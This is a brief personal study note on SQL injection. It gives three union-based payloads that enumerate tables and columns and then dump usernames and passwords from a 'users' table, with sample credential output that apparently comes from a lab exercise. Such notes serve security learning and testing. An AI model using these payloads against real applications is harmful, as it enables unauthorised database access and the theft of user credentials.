# Learning SQL Injection

Just taking some notes about different SQL Injections.

#### This will display the tables
```
id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = database()--
```
#### This will display the columns from the selected table
```
id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'--
```
#### This will display the username and password
```
id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM users
```
##### Example
> admin:p4ssword
> martin:pa$$word
> jim:work12
